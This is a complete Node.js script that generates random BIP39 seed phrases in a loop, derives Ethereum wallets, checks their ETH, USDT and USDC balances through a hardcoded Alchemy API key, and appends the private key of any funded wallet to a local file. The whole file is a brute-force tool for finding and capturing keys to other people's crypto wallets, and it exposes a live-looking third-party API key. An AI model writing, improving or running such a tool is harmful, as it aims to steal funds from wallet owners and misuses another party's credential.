const { ethers, Wallet } = require('ethers');
const axios = require('axios');
const fs = require('fs');
const bip39 = require('bip39');

const usdtAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
const usdcAddress = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';

// Function to generate a random seed phrase
function generateSeedPhrase() {
    return bip39.generateMnemonic();
}

// Function to create a wallet from a seed phrase
function createWalletFromSeed(seedPhrase) {
    const wallet = Wallet.fromPhrase(seedPhrase);
    return wallet;
}

// Function to get ETH balance
async function getEthBalance(address) {
    const provider = new ethers.JsonRpcProvider('https://eth-mainnet.g.alchemy.com/v2/scS7rThd70YD61xEU80rJAZnQArQ36Dw');
    const balance = await provider.getBalance(address);
    return balance;
}

// Function to get token balance (USDT, USDC, etc.)
async function getTokenBalance(address, tokenContractAddress) {
    const provider = new ethers.JsonRpcProvider('https://eth-mainnet.g.alchemy.com/v2/scS7rThd70YD61xEU80rJAZnQArQ36Dw');
    const ERC20_ABI = [
        "function balanceOf(address owner) view returns (uint256)"
    ];
    const contract = new ethers.Contract(tokenContractAddress, ERC20_ABI, provider);
    const balance = await contract.balanceOf(address);
    return balance;
}

// Function to check balances and write to file if there is any balance
async function checkBalances(seedPhrase) {
    const wallet = createWalletFromSeed(seedPhrase);
    const address = wallet.address;
    const privateKey = wallet.privateKey;

    console.log(`Checking balances for address: ${address}`);

    const ethBalance = await getEthBalance(address);
    const usdtBalance = await getTokenBalance(address, usdtAddress);
    const usdcBalance = await getTokenBalance(address, usdcAddress);

    if (ethBalance > 0 || usdtBalance > 0 || usdcBalance > 0) {
        const balances = {
            address: address,
            key: privateKey,
            eth: ethBalance,
            usdt: usdtBalance,
            usdc: usdcBalance
        };

        fs.writeFileSync('wallet_balances.txt', JSON.stringify(balances, null, 2), { flag: 'a' });
        console.log(`Balances written to file for address: ${address}`);
    } else {
        console.log(`No balances found for address: ${address}`);
    }
}

// Generate a random seed phrase


// Function to repeatedly check balances every 30 seconds
function startBalanceChecks() {
    let seedPhrase = generateSeedPhrase();
    console.log(`Generated seed phrase: ${seedPhrase}`);
    checkBalances(seedPhrase)
        .catch(err => console.error(err));

    setInterval(() => {
        seedPhrase = generateSeedPhrase();
        console.log(`Generated seed phrase: ${seedPhrase}`);
        checkBalances(seedPhrase)
            .catch(err => console.error(err));
    }, 10000); // 10 seconds in milliseconds
}

startBalanceChecks();
